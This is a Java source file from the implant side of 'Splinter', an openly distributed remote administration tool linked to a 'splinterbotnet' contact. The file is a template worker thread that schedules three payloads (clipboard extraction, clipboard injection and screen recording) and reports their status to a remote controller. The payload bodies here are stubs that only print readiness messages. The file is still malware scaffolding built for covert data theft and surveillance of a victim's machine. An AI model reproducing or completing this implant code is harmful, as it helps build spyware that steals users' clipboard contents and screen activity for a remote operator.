/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant.Payloads;

import Controller.Drivers.Drivers;
import Implant.Driver;
import Implant.Splinter_IMPLANT;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.Timer;

public class TEMPLATE_Worker_Thread_Payloads extends Thread
  implements Runnable, ActionListener
{
  public static final String strMyClassName = "Worker_Thread_Payloads";
  Timer tmrInterrupt = null;
  int timerInterrupt_millis = 1000;

  boolean killThisThread = false;

  Splinter_IMPLANT implant = null;

  boolean dismissInterrupt = false;

  public int payload_execution_index = 0;
  public static final int PAYLOAD_CLIPBOARD_EXTRACTION = 0;
  public static final int PAYLOAD_CLIPBOARD_INJECTION = 1;
  public static final int PAYLOAD_RECORD_SCREEN = 2;
  public static final String[] arrPayloadTypes = { 
    "CLIPBOARD EXTRACTION", 
    "CLIPBOARD INJECTION", 
    "RECORD SCREEN" };

  public static volatile boolean TERMINATE_ALL_WORKERS_CLIPBOARD = false;
  public static volatile boolean TERMINATE_ALL_WORKERS_RECORD_SCREEN = false;

  public String payloadType = "";

  public TEMPLATE_Worker_Thread_Payloads(int timing_millis, Splinter_IMPLANT agent, int payload_index)
  {
    try
    {
      this.implant = agent;
      this.timerInterrupt_millis = timing_millis;
      this.payload_execution_index = payload_index;
      this.payloadType = arrPayloadTypes[this.payload_execution_index];
      this.killThisThread = false;
      this.dismissInterrupt = false;

      if ((payload_index == 0) || (payload_index == 1))
      {
        TERMINATE_ALL_WORKERS_CLIPBOARD = false;
      }

      if (payload_index == 2)
      {
        TERMINATE_ALL_WORKERS_RECORD_SCREEN = false;
      }

      start();
    }
    catch (Exception e)
    {
      Driver.eop("Null Constructor", "Worker_Thread_Payloads", e, "", false);
      this.killThisThread = true;
    }
  }

  public void run()
  {
    try
    {
      if (!this.killThisThread)
      {
        this.tmrInterrupt = new Timer(this.timerInterrupt_millis, this);
        this.tmrInterrupt.start();

        String notification = "Worker Thread Started for " + this.payloadType + " interrupt interval: " + this.timerInterrupt_millis / 1000 + " second(s)";
        sendToController(notification);
        Driver.sop(notification);
      }
      else
      {
        sendToController("UNABLE TO START WORKER THREAD!!!");
      }

    }
    catch (Exception e)
    {
      Driver.eop("run", "Worker_Thread_Payloads", e, "", false);
    }
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.tmrInterrupt)
      {
        if (((TERMINATE_ALL_WORKERS_CLIPBOARD) && (this.payload_execution_index == 0)) || (this.payload_execution_index == 1))
        {
          this.killThisThread = true;

          String kill = "Worker Thread Kill command received for all " + this.payloadType + " payload types.... killing this thread softly...";
          sendToController(kill);
          Driver.sop(kill);
        }

        if ((TERMINATE_ALL_WORKERS_RECORD_SCREEN) && (this.payload_execution_index == 2))
        {
          this.killThisThread = true;

          String kill = "Worker Thread Kill command received for all " + this.payloadType + " payload types.... killing this thread softly...";
          sendToController(kill);
          Driver.sop(kill);
        }

        if (this.killThisThread)
        {
          String kill = "Worker Thread Kill command received.... killing this thread softly...";
          sendToController(kill);
          Driver.sop(kill);
          try
          {
            this.tmrInterrupt.stop();
          }
          catch (Exception localException1)
          {
          }
        }

        if (!this.dismissInterrupt)
        {
          this.dismissInterrupt = true;

          executeAction(this.payload_execution_index);

          this.dismissInterrupt = false;
        }

      }

    }
    catch (Exception e)
    {
      Driver.eop("AE", "Worker_Thread_Payloads", e, e.getLocalizedMessage(), false);
    }
  }

  public static boolean executeAction(int execution_index)
  {
    try
    {
      switch (execution_index)
      {
      case 0:
        Driver.sop("READY TO EXTRACT CLIPBOARD");

        break;
      case 1:
        Driver.sop("READY TO INJECT CLIPBOARD");

        break;
      case 2:
        Driver.sop("READY TO RECORD SCREEN");

        break;
      default:
        Driver.sop("Unknown execution action received in Worker_Thread_Payloads");
        return false;
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("executionAction", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean sendToController(String strToSend)
  {
    try
    {
      if (this.implant != null)
      {
        this.implant.sendToController(strToSend, false, false);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendToController", "Worker_Thread_Payloads", e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}